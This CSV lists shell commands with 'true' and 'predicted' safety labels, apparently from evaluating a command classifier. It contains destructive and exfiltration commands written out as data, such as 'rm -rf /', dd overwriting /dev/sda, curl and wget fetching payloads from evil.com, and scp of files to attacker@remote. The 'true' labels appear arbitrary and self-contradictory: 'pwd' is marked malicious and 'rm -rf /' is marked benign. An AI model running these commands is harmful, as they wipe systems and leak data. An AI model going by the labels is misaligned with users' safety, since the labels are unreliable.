command,true_label,predicted_label
history,SUSPICIOUS,BENIGN
echo 'hacked' >> /var/log/syslog,SUSPICIOUS,BENIGN
chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
cat /root/.bashrc,MALICIOUS,BENIGN
cat homework.txt,MALICIOUS,BENIGN
cd   /tmp/,MALICIOUS,SUSPICIOUS
cat /var/log/syslog,MALICIOUS,BENIGN
cat homework.txt,SUSPICIOUS,BENIGN
curl http://unknown.site/script.sh,MALICIOUS,BENIGN
 du -sh,SUSPICIOUS,BENIGN
echo   'hacked' >> /root/.bashrc,MALICIOUS,SUSPICIOUS
cd /root,MALICIOUS,BENIGN
curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
curl   https://evil.com/update.bin,SUSPICIOUS,BENIGN
rm -rf /,SUSPICIOUS,BENIGN
sudo apt install nmap,SUSPICIOUS,BENIGN
cat /home/user/info.txt ,SUSPICIOUS,MALICIOUS
cat /var/log/syslog,BENIGN,MALICIOUS
dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
chmod 777 /root/.bashrc,BENIGN,SUSPICIOUS
FIND / -NAME 'TEST',MALICIOUS,BENIGN
ls /var/www,SUSPICIOUS,BENIGN
sudo -l,MALICIOUS,SUSPICIOUS
rm -rf   /home/user,MALICIOUS,BENIGN
grep 'password' /etc/passwd,SUSPICIOUS,MALICIOUS
netstat -tulnp,MALICIOUS,BENIGN
CURL   HTTPS://SAFE-SITE.ORG/UPDATE.SH,MALICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
iptables -F,SUSPICIOUS,BENIGN
rm -rf /var/,BENIGN,MALICIOUS
ps aux,MALICIOUS,BENIGN
env,SUSPICIOUS,BENIGN
find / -name 'test',MALICIOUS,BENIGN
 cat /var/log/auth.log,SUSPICIOUS,BENIGN
watch   netstat -an,MALICIOUS,BENIGN
echo 'pwned' >> /etc/shadow,MALICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
cat /home/user/info.txt,SUSPICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
touch homework.doc,MALICIOUS,SUSPICIOUS
scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
cat /home/user/info.txt,SUSPICIOUS,MALICIOUS
find / -name 'test',BENIGN,MALICIOUS
mkdir test,MALICIOUS,SUSPICIOUS
cat /etc/shadow ,MALICIOUS,BENIGN
ECHO   'HACKED' > /ROOT/.BASHRC,MALICIOUS,BENIGN
pwd,MALICIOUS,BENIGN
uname   -a,MALICIOUS,BENIGN
du -sh,MALICIOUS,BENIGN
curl -O http://fileshare.com/exploit.zip,MALICIOUS,BENIGN
scp file.txt user@malicious.com:/root/,SUSPICIOUS,BENIGN
echo 'hello world',SUSPICIOUS,BENIGN
curl https://evil.com/exploit.zip,MALICIOUS,BENIGN
du -sh,SUSPICIOUS,BENIGN
curl   -o http://fileshare.com/payload.sh,MALICIOUS,SUSPICIOUS
chmod   777 /etc/shadow,MALICIOUS,BENIGN
curl   -O http://suspicious.org/payload.sh,BENIGN,MALICIOUS
echo 'hacked' >> /etc/shadow,MALICIOUS,BENIGN
cat /var/log/auth.log ,SUSPICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
ls -al,MALICIOUS,BENIGN
cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
CAT   /VAR/LOG/AUTH.LOG,MALICIOUS,BENIGN
CURL   HTTPS://EVIL.COM/EXPLOIT.ZIP,MALICIOUS,BENIGN
cat /var/log/syslog,SUSPICIOUS,BENIGN
rm -rf /,SUSPICIOUS,MALICIOUS
history,MALICIOUS,BENIGN
cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
watch netstat -an,SUSPICIOUS,BENIGN
wget http://fileshare.com/exploit.zip,MALICIOUS,BENIGN
cat /etc/shadow,SUSPICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
cat /root/.bashrc,SUSPICIOUS,BENIGN
ping google.com,SUSPICIOUS,BENIGN
echo 'pwned' >> /etc/shadow ,MALICIOUS,BENIGN
ps aux | grep sshd,SUSPICIOUS,BENIGN
curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
scp file.txt root@backup.server:/tmp/,MALICIOUS,BENIGN
FIND / -NAME   'TEST',SUSPICIOUS,BENIGN
which   python,MALICIOUS,BENIGN
curl -O http://malicious.com/malware.bin ,SUSPICIOUS,BENIGN
CD /TMP/,MALICIOUS,SUSPICIOUS
rm -rf /* --no-preserve-root,SUSPICIOUS,MALICIOUS
ping google.com,MALICIOUS,BENIGN
sudo apt update,MALICIOUS,BENIGN
curl http://unknown.site/script.sh,MALICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
cat   /var/log/auth.log,SUSPICIOUS,MALICIOUS
ps aux,MALICIOUS,BENIGN
curl -O http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
 touch homework.doc,SUSPICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
netstat -tulnp,SUSPICIOUS,BENIGN
watch netstat -an,SUSPICIOUS,MALICIOUS
sudo apt update,BENIGN,MALICIOUS
echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
echo 'owned' > /root/.bashrc,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
cat   welcome.txt,MALICIOUS,BENIGN
rm   -rf /home/user,SUSPICIOUS,BENIGN
ps aux,MALICIOUS,BENIGN
curl   http://unknown.site/script.sh,SUSPICIOUS,BENIGN
 cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
chmod 777 /var/log/syslog,MALICIOUS,BENIGN
chmod 777   /etc/shadow,MALICIOUS,SUSPICIOUS
which python,SUSPICIOUS,MALICIOUS
find / -name   'test',SUSPICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,SUSPICIOUS,MALICIOUS
cd /root/,MALICIOUS,BENIGN
DD IF=/DEV/ZERO   OF=/DEV/SDA,MALICIOUS,BENIGN
CAT   /ETC/PASSWD,MALICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
cat readme.md,MALICIOUS,BENIGN
rm -rf /var/,SUSPICIOUS,BENIGN
cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
ls /root/ ,SUSPICIOUS,BENIGN
echo 'pwned' >> /var/log/syslog,SUSPICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
iptables -f,MALICIOUS,BENIGN
cd   /tmp/,MALICIOUS,BENIGN
cat /root/.bashrc,SUSPICIOUS,BENIGN
cat readme.md,SUSPICIOUS,BENIGN
touch homework.doc,MALICIOUS,BENIGN
chmod 777 /root/.bashrc,MALICIOUS,SUSPICIOUS
cd /tmp/,MALICIOUS,SUSPICIOUS
cat /etc/shadow,SUSPICIOUS,BENIGN
chmod 777 /etc/shadow,BENIGN,SUSPICIOUS
echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
ping   google.com,MALICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
df -h,MALICIOUS,SUSPICIOUS
curl   -o http://suspicious.org/exploit.zip,SUSPICIOUS,BENIGN
sudo apt install net-tools,MALICIOUS,BENIGN
mkdir test,MALICIOUS,SUSPICIOUS
wget http://fileshare.com/exploit.zip,SUSPICIOUS,MALICIOUS
curl https://suspicious.org/exploit.zip,SUSPICIOUS,BENIGN
 mkdir test,MALICIOUS,BENIGN
cat /etc/shadow,MALICIOUS,BENIGN
netstat -tulnp,BENIGN,MALICIOUS
echo 'hello',SUSPICIOUS,BENIGN
wget http://malicious.com/payload.sh,MALICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
curl -O http://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
sudo apt update,SUSPICIOUS,BENIGN
ping google.com,BENIGN,SUSPICIOUS
sudo su,SUSPICIOUS,BENIGN
touch homework.doc,MALICIOUS,BENIGN
top -n 1,SUSPICIOUS,BENIGN
 ps aux,MALICIOUS,BENIGN
chmod 777 /etc/shadow,BENIGN,MALICIOUS
cat welcome.txt,SUSPICIOUS,BENIGN
cat   welcome.txt,MALICIOUS,BENIGN
cat   /root/.bashrc,SUSPICIOUS,MALICIOUS
cat /etc/shadow,SUSPICIOUS,BENIGN
cat   /etc/passwd,BENIGN,SUSPICIOUS
sudo -l,SUSPICIOUS,BENIGN
ping google.com,BENIGN,SUSPICIOUS
rm -rf /var/ ,BENIGN,SUSPICIOUS
find / -name 'test',MALICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
CAT /HOME/USER/INFO.TXT,MALICIOUS,BENIGN
ls   /var/www,SUSPICIOUS,BENIGN
curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
ifconfig,BENIGN,SUSPICIOUS
echo 'hello world',MALICIOUS,BENIGN
ifconfig,MALICIOUS,SUSPICIOUS
chmod 777 /var/log/syslog,SUSPICIOUS,BENIGN
cat /etc/shadow,BENIGN,MALICIOUS
CURL -O HTTP://FILESHARE.COM/UPDATE.BIN,MALICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,SUSPICIOUS,BENIGN
rm -rf /,SUSPICIOUS,BENIGN
pwd,SUSPICIOUS,MALICIOUS
ls /root/,MALICIOUS,BENIGN
iptables -F,MALICIOUS,BENIGN
chmod 777 /root/.bashrc,SUSPICIOUS,BENIGN
ifconfig,MALICIOUS,BENIGN
echo 'owned' >> /etc/shadow,MALICIOUS,BENIGN
echo 'owned'   >> /etc/shadow,MALICIOUS,BENIGN
echo 'hello world',MALICIOUS,SUSPICIOUS
env,BENIGN,SUSPICIOUS
TOP -N 1,SUSPICIOUS,BENIGN
NETSTAT -TULNP ,SUSPICIOUS,BENIGN
pwd,MALICIOUS,BENIGN
curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
rm -rf /* --no-preserve-root,MALICIOUS,SUSPICIOUS
find / -name   'test',MALICIOUS,BENIGN
mkdir   test,MALICIOUS,BENIGN
history,SUSPICIOUS,MALICIOUS
curl https://suspicious.org/exploit.zip,MALICIOUS,BENIGN
mv   /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
curl -O http://suspicious.org/payload.sh,MALICIOUS,BENIGN
uname -a,MALICIOUS,BENIGN
rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
sudo apt install nmap,MALICIOUS,BENIGN
cat welcome.txt,SUSPICIOUS,BENIGN
curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
cd /root,SUSPICIOUS,BENIGN
du   -sh,MALICIOUS,BENIGN
top -n 1,SUSPICIOUS,BENIGN
cat /etc/shadow,MALICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
wget http://evil.com/payload.sh,SUSPICIOUS,MALICIOUS
ls -al,MALICIOUS,BENIGN
cat welcome.txt,SUSPICIOUS,BENIGN
echo   'owned' >> /var/log/syslog,BENIGN,MALICIOUS
ls /tmp/,MALICIOUS,BENIGN
cat   /home/user/info.txt,SUSPICIOUS,BENIGN
scp backup.sql user@malicious.com:/tmp/,MALICIOUS,BENIGN
 netstat -tulnp,MALICIOUS,BENIGN
DD IF=/DEV/ZERO OF=/DEV/SDA,SUSPICIOUS,BENIGN
sudo su,SUSPICIOUS,BENIGN
cat notes.txt,BENIGN,MALICIOUS
echo 'malware' > /tmp/malware.sh,SUSPICIOUS,BENIGN
iptables -F,SUSPICIOUS,BENIGN
cat   /var/log/syslog,MALICIOUS,BENIGN
MKDIR TEST,SUSPICIOUS,BENIGN
mkdir test,SUSPICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,SUSPICIOUS,BENIGN
ENV,MALICIOUS,BENIGN
history,BENIGN,MALICIOUS
sudo apt install htop,MALICIOUS,BENIGN
history,SUSPICIOUS,BENIGN
which python,SUSPICIOUS,BENIGN
which python,SUSPICIOUS,BENIGN
wget http://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
cat homework.txt,SUSPICIOUS,BENIGN
PING GOOGLE.COM,MALICIOUS,SUSPICIOUS
echo   'hello world',SUSPICIOUS,BENIGN
cat /var/log/auth.log,SUSPICIOUS,MALICIOUS
rm -rf /var/,SUSPICIOUS,BENIGN
scp file.txt user@malicious.com:/tmp/,SUSPICIOUS,BENIGN
grep 'password' /etc/passwd,MALICIOUS,BENIGN
cat /etc/passwd ,MALICIOUS,BENIGN
cat welcome.txt,BENIGN,MALICIOUS
WGET HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,MALICIOUS,BENIGN
cat homework.txt,SUSPICIOUS,BENIGN
echo 'pwned' > /etc/shadow,MALICIOUS,BENIGN
which python,MALICIOUS,BENIGN
DF -H ,MALICIOUS,BENIGN
iptables -F ,MALICIOUS,BENIGN
ECHO 'OWNED' >   /ETC/SHADOW,SUSPICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
df -h,SUSPICIOUS,BENIGN
cat notes.txt,SUSPICIOUS,BENIGN
 rm -rf /home/user,SUSPICIOUS,BENIGN
top -n 1,BENIGN,MALICIOUS
echo 'owned' >> /var/log/syslog,BENIGN,MALICIOUS
rm -rf /var/,BENIGN,SUSPICIOUS
mv /bin/bash /tmp/bash ,MALICIOUS,BENIGN
curl -O http://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
cat /var/log/auth.log,MALICIOUS,BENIGN
cat homework.txt,SUSPICIOUS,BENIGN
sudo apt install nmap,MALICIOUS,SUSPICIOUS
sudo apt install net-tools,SUSPICIOUS,MALICIOUS
cat /var/log/auth.log,MALICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,SUSPICIOUS,BENIGN
echo 'hacked' >> /etc/shadow,SUSPICIOUS,BENIGN
scp   file.txt admin@192.168.0.2:/root/,BENIGN,SUSPICIOUS
grep 'password' /etc/passwd,MALICIOUS,BENIGN
CAT NOTES.TXT,MALICIOUS,BENIGN
cat ~/.ssh/known_hosts,BENIGN,SUSPICIOUS
chmod 777 /var/log/syslog,MALICIOUS,BENIGN
curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
ECHO 'HACKED' >> /ROOT/.BASHRC,MALICIOUS,BENIGN
ls   /root/,SUSPICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,BENIGN,MALICIOUS
chmod 777 /var/log/syslog,SUSPICIOUS,BENIGN
whoami,SUSPICIOUS,BENIGN
netstat   -tulnp,MALICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
curl -O http://evil.com/update.bin,SUSPICIOUS,BENIGN
grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
cat   homework.txt,SUSPICIOUS,BENIGN
curl   https://evil.com/payload.sh,SUSPICIOUS,MALICIOUS
ssh -L 8080:target.com:80   attacker@remote,SUSPICIOUS,BENIGN
cd /root,MALICIOUS,SUSPICIOUS
grep 'password' /etc/passwd ,MALICIOUS,BENIGN
echo   'hacked' > /var/log/syslog,MALICIOUS,BENIGN
top -n 1,SUSPICIOUS,MALICIOUS
cat   /var/log/auth.log,MALICIOUS,BENIGN
curl -o   http://suspicious.org/exploit.zip,SUSPICIOUS,BENIGN
ifconfig,MALICIOUS,SUSPICIOUS
dd if=/dev/zero of=/dev/sda,BENIGN,SUSPICIOUS
grep   root /etc/passwd,MALICIOUS,BENIGN
LS /VAR/WWW,SUSPICIOUS,BENIGN
find / -name 'test',SUSPICIOUS,BENIGN
ping google.com,BENIGN,SUSPICIOUS
cat /var/log/syslog,SUSPICIOUS,BENIGN
watch netstat -an,MALICIOUS,BENIGN
df -h,SUSPICIOUS,BENIGN
df -h,MALICIOUS,BENIGN
cat   .bashrc,MALICIOUS,BENIGN
wget http://fileshare.com/update.bin ,BENIGN,MALICIOUS
sudo -l,MALICIOUS,BENIGN
cd /tmp/,MALICIOUS,BENIGN
curl -O http://fileshare.com/update.bin,MALICIOUS,BENIGN
env,MALICIOUS,BENIGN
ifconfig,SUSPICIOUS,MALICIOUS
cat /var/log/auth.log,MALICIOUS,BENIGN
WHOAMI,BENIGN,SUSPICIOUS
cat notes.txt ,SUSPICIOUS,BENIGN
rm -rf /var/,MALICIOUS,BENIGN
ping google.com,MALICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
wget http://malicious.com/payload.sh,MALICIOUS,SUSPICIOUS
uname -a,MALICIOUS,SUSPICIOUS
netstat -tulnp,SUSPICIOUS,BENIGN
cat homework.txt,MALICIOUS,BENIGN
 cat welcome.txt,BENIGN,SUSPICIOUS
 sudo -l,SUSPICIOUS,MALICIOUS
echo 'hello',SUSPICIOUS,BENIGN
cat /etc/shadow,MALICIOUS,BENIGN
cd /var/www,MALICIOUS,BENIGN
WHICH   PYTHON,BENIGN,SUSPICIOUS
echo 'hacked' > /var/log/syslog,SUSPICIOUS,BENIGN
history,MALICIOUS,BENIGN
cat welcome.txt,BENIGN,MALICIOUS
whoami ,SUSPICIOUS,BENIGN
curl http://unknown.site/script.sh,MALICIOUS,BENIGN
find / -name 'test',MALICIOUS,BENIGN
which   python,SUSPICIOUS,MALICIOUS
cat /home/user/info.txt,MALICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,SUSPICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
cat   ~/.ssh/known_hosts,BENIGN,SUSPICIOUS
cat notes.txt,MALICIOUS,BENIGN
echo 'pwned' > /root/.bashrc,MALICIOUS,BENIGN
curl -O http://evil.com/exploit.zip,MALICIOUS,BENIGN
sudo apt install htop,MALICIOUS,SUSPICIOUS
cd /root/,BENIGN,MALICIOUS
sudo apt   install htop,MALICIOUS,BENIGN
echo   'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
echo 'hello world',MALICIOUS,BENIGN
mkdir test,SUSPICIOUS,BENIGN
wget http://malicious.com/payload.sh,BENIGN,MALICIOUS
cat /root/.bashrc,BENIGN,MALICIOUS
scp data.tar.gz user@backup.server:/var/www,SUSPICIOUS,MALICIOUS
RM -RF   /HOME/USER,SUSPICIOUS,BENIGN
curl https://suspicious.org/update.bin,MALICIOUS,BENIGN
 cat /var/log/auth.log,MALICIOUS,BENIGN
curl https://suspicious.org/update.bin,BENIGN,SUSPICIOUS
cat /etc/shadow,SUSPICIOUS,BENIGN
SUDO APT INSTALL HTOP,MALICIOUS,BENIGN
curl http://unknown.site/script.sh,MALICIOUS,BENIGN
rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
cat /etc/passwd,SUSPICIOUS,MALICIOUS
ps aux ,SUSPICIOUS,BENIGN
 grep root /etc/passwd,SUSPICIOUS,BENIGN
CD /ROOT/,SUSPICIOUS,BENIGN
env,SUSPICIOUS,BENIGN
cd /var/www,SUSPICIOUS,BENIGN
 ps aux,SUSPICIOUS,BENIGN
 WATCH NETSTAT -AN,SUSPICIOUS,MALICIOUS
top -n 1,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
echo 'pwned' > /root/.bashrc ,BENIGN,MALICIOUS
cat /etc/passwd,SUSPICIOUS,BENIGN
ifconfig ,SUSPICIOUS,MALICIOUS
cd /root ,MALICIOUS,BENIGN
 ping google.com,SUSPICIOUS,BENIGN
watch netstat -an,SUSPICIOUS,BENIGN
mkdir test,MALICIOUS,BENIGN
ping google.com,SUSPICIOUS,BENIGN
cat   /var/log/syslog,MALICIOUS,BENIGN
wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
top -n 1,SUSPICIOUS,BENIGN
sudo su,SUSPICIOUS,BENIGN
cd /var/www,SUSPICIOUS,BENIGN
rm -rf /,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
ssh -L   8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
pwd,SUSPICIOUS,BENIGN
find / -name 'test' ,SUSPICIOUS,MALICIOUS
curl -O http://malicious.com/malware.bin,BENIGN,SUSPICIOUS
grep root /etc/passwd,SUSPICIOUS,BENIGN
rm -rf /,MALICIOUS,BENIGN
scp data.tar.gz root@malicious.com:/var/www,MALICIOUS,BENIGN
top   -n 1,MALICIOUS,BENIGN
scp data.tar.gz root@192.168.0.2:/root/,SUSPICIOUS,BENIGN
echo 'hello world',MALICIOUS,BENIGN
 cat /home/user/todo.txt,SUSPICIOUS,BENIGN
df -h,MALICIOUS,BENIGN
which python,MALICIOUS,BENIGN
echo 'pwned' >> /var/log/syslog,MALICIOUS,BENIGN
wget http://evil.com/payload.sh,MALICIOUS,SUSPICIOUS
touch   homework.doc,MALICIOUS,BENIGN
cat readme.md,MALICIOUS,BENIGN
LS /VAR/WWW,MALICIOUS,BENIGN
touch homework.doc,SUSPICIOUS,BENIGN
chmod 777 /var/log/syslog,MALICIOUS,BENIGN
 sudo apt install htop,MALICIOUS,BENIGN
chmod 777 /root/.bashrc,SUSPICIOUS,MALICIOUS
WGET HTTP://MALICIOUS.COM/PAYLOAD.SH,MALICIOUS,BENIGN
history,SUSPICIOUS,BENIGN
curl https://suspicious.org/payload.sh,SUSPICIOUS,BENIGN
CURL HTTP://UNKNOWN.SITE/SCRIPT.SH ,SUSPICIOUS,BENIGN
cat /home/user/todo.txt,MALICIOUS,BENIGN
chmod 777 /var/log/syslog,MALICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
netstat -tulnp,MALICIOUS,BENIGN
cd /tmp/ ,MALICIOUS,BENIGN
echo 'hello   world',BENIGN,SUSPICIOUS
echo 'hacked' >   /root/.bashrc,BENIGN,MALICIOUS
ps aux | grep sshd,SUSPICIOUS,BENIGN
curl https://fileshare.com/payload.sh,MALICIOUS,BENIGN
cat /etc/shadow,SUSPICIOUS,BENIGN
 curl -o http://evil.com/exploit.zip,SUSPICIOUS,MALICIOUS
ps aux |   grep nginx,MALICIOUS,BENIGN
ping google.com,SUSPICIOUS,BENIGN
 du -sh,MALICIOUS,BENIGN
cat   /var/log/syslog,MALICIOUS,BENIGN
scp backup.sql user@malicious.com:/root/,MALICIOUS,BENIGN
sudo apt update,SUSPICIOUS,BENIGN
cat /etc/passwd,SUSPICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,BENIGN,MALICIOUS
scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
ls /root/,SUSPICIOUS,BENIGN
cat /var/log/auth.log,SUSPICIOUS,BENIGN
echo 'malware' >   /tmp/malware.sh,SUSPICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,MALICIOUS,SUSPICIOUS
cd /var/www,SUSPICIOUS,BENIGN
echo 'owned' >> /var/log/syslog,MALICIOUS,SUSPICIOUS
cat welcome.txt,SUSPICIOUS,BENIGN
mkdir test,SUSPICIOUS,BENIGN
mv /bin/bash   /tmp/bash,SUSPICIOUS,BENIGN
cd /root/,SUSPICIOUS,BENIGN
rm -rf /* --no-preserve-root,MALICIOUS,BENIGN
which python,MALICIOUS,BENIGN
TOP -N 1 ,BENIGN,SUSPICIOUS
pwd,BENIGN,MALICIOUS
cat notes.txt,SUSPICIOUS,BENIGN
curl -O http://evil.com/exploit.zip,SUSPICIOUS,BENIGN
mkdir   test,MALICIOUS,BENIGN
chmod 777 /root/.bashrc,SUSPICIOUS,BENIGN
grep root /etc/passwd,SUSPICIOUS,BENIGN
cd /root,MALICIOUS,BENIGN
cd /tmp/,MALICIOUS,BENIGN
ls /tmp/,MALICIOUS,BENIGN
curl -O http://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
rm -rf /,MALICIOUS,BENIGN
ls -al,MALICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
ls -al,SUSPICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,SUSPICIOUS
cat /root/.bashrc,SUSPICIOUS,BENIGN
cd /root,MALICIOUS,BENIGN
scp   backup.sql admin@malicious.com:/tmp/,MALICIOUS,BENIGN
sudo su,SUSPICIOUS,BENIGN
sudo apt install net-tools,BENIGN,MALICIOUS
curl -O http://fileshare.com/payload.sh,BENIGN,SUSPICIOUS
ps aux | grep nginx,SUSPICIOUS,BENIGN
cat   .bashrc,SUSPICIOUS,BENIGN
cat /etc/shadow,BENIGN,SUSPICIOUS
df -h,SUSPICIOUS,MALICIOUS
chmod 777 /root/.bashrc,BENIGN,MALICIOUS
sudo apt install net-tools,BENIGN,SUSPICIOUS
pwd,SUSPICIOUS,BENIGN
echo 'pwned' > /etc/shadow,MALICIOUS,BENIGN
rm -rf /* --no-preserve-root,MALICIOUS,BENIGN
ls /tmp/,MALICIOUS,BENIGN
cd /tmp/,MALICIOUS,BENIGN
curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
cat welcome.txt,SUSPICIOUS,BENIGN
cat /var/log/syslog,MALICIOUS,BENIGN
wget   http://malicious.com/payload.sh,MALICIOUS,BENIGN
top -n 1,BENIGN,MALICIOUS
echo 'hello world',SUSPICIOUS,BENIGN
curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
wget http://evil.com/payload.sh,MALICIOUS,BENIGN
curl https://suspicious.org/payload.sh,SUSPICIOUS,BENIGN
 cat readme.md,MALICIOUS,BENIGN
wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
curl https://evil.com/payload.sh,BENIGN,MALICIOUS
mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
find / -name 'test',MALICIOUS,BENIGN
echo 'hacked' >> /root/.bashrc,MALICIOUS,BENIGN
ps aux | grep sshd,SUSPICIOUS,BENIGN
ls /root/,BENIGN,MALICIOUS
whoami,BENIGN,SUSPICIOUS
scp data.tar.gz user@malicious.com:/tmp/,BENIGN,SUSPICIOUS
ps aux | grep sshd,MALICIOUS,BENIGN
cat /etc/shadow,SUSPICIOUS,BENIGN
chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
 cat welcome.txt,SUSPICIOUS,BENIGN
touch homework.doc,MALICIOUS,BENIGN
sudo apt install net-tools,MALICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
cat /var/log/auth.log,SUSPICIOUS,BENIGN
history,BENIGN,MALICIOUS
grep   'password' /etc/passwd,SUSPICIOUS,BENIGN
ls /var/www ,SUSPICIOUS,BENIGN
which python,BENIGN,SUSPICIOUS
echo 'hello',MALICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
CAT   /HOME/USER/INFO.TXT,BENIGN,SUSPICIOUS
sudo apt update,MALICIOUS,BENIGN
curl https://evil.com/exploit.zip,SUSPICIOUS,MALICIOUS
LS /VAR/WWW ,BENIGN,MALICIOUS
chmod 777   /root/.bashrc,MALICIOUS,BENIGN
pwd,SUSPICIOUS,BENIGN
ifconfig,MALICIOUS,BENIGN
grep root /etc/passwd,MALICIOUS,BENIGN
 scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
cat /root/.bashrc,SUSPICIOUS,BENIGN
 ls /var/www,SUSPICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
ls -al,MALICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,BENIGN,SUSPICIOUS
curl https://safe-site.org/update.sh ,MALICIOUS,SUSPICIOUS
watch netstat -an,BENIGN,MALICIOUS
